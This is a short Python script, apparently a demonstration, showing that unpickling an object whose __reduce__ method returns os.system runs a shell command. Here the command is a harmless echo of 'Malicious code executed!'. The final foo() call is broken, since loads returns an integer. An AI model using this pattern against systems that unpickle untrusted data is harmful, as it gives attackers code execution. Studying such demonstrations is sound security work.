import pickle

class MyObject:
    def __init__(self, text):
        self.text = text

    def foo(self):
        print("foo method")

    def foo2(self):
        print("foo2 method")

    def __reduce__(self):
        #return (print, (self.text,))
        import os
        return (os.system, ('echo Malicious code executed!',))

obj = MyObject("Hello, world!")

pickled_obj = pickle.dumps(obj)

obj2 = pickle.loads(pickled_obj)

#obj.foo()
obj2.foo()